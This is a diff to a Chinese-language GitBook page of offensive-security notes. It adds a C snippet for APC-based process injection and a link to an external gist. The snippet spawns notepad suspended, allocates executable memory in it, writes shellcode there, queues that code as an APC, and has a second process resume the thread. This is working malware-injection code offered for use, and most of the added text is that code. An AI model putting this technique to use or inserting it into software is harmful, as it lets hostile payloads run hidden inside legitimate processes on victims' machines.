@@ -53,9 +53,38 @@ int main(int argc, char* argv[]) {
 
 ```
 
+![](../.gitbook/assets/image%20%28242%29.png)
+
+## 同理
+
+```text
+    if (argv[1]==NULL)
+    {
+        STARTUPINFOA si = { 0 };
+        si.cb = sizeof(si);
+        PROCESS_INFORMATION pi = { 0 };
+
+        CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+        VirtualAllocEx(pi.hProcess, (PVOID)0x0000480000000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        WriteProcessMemory(pi.hProcess, (PVOID)0x0000480000000000, shellcode, sizeof(shellcode), NULL);
+        char cmd[MAX_PATH] = {0};
+        wsprintfA(cmd, "%s %d", argv[0], pi.dwThreadId);
+        QueueUserAPC((PAPCFUNC)0x0000480000000000, pi.hThread, NULL);
+        CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+    }
+    else
+    {
+        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, NULL, atoi(argv[1]));
+        ResumeThread(hThread);
+    }
+    
+```
+
 ![](../.gitbook/assets/image%20%28241%29.png)
 
-## 优化
+## LINK
 
-再传入ppid\(略略略\)。
+{% embed url="https://gist.github.com/theevilbit/073ca4eb15383eb3254272fc24632efd" %}
+
+
 
